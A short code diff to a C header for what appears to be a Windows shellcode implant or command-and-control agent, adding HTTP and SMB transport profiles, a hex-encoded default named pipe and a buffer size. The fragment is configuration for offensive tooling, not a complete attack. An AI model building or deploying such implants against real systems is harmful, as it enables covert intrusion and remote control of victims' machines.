@@ -4,6 +4,24 @@
 #include <windows.h>
 #include <LdrLoad.h>
 
+// Transport profile type
+#define PROFILE_HTTP 0x25
+#define PROFILE_SMB  0x15
+
+#ifndef PAIN_PROFILE_C2
+#define PAIN_PROFILE_C2 PROFILE_HTTP
+#endif
+
+// SMB named-pipe defaults 
+// Pipe name as a hex byte array - avoids all Makefile / shell backslash escaping.
+// Default: \\.\pipe\pain  (0x5c 0x5c 0x2e 0x5c 0x70 0x69 0x70 0x65 0x5c 0x70 0x61 0x69 0x6e 0x00)
+#ifndef PAIN_PIPE_NAME
+#define PAIN_PIPE_NAME {0x5c,0x5c,0x2e,0x5c,0x70,0x69,0x70,0x65,0x5c,0x70,0x61,0x69,0x6e,0x00}
+#endif
+
+// I/O buffer size for the named pipe (64 KB each direction)
+#define PIPE_BUFFER_LENGTH 0x10000
+
 // Forces every function/data into the .text$B section (shellcode blob)
 #define DECLFN __attribute__((section(".text$B")))
 
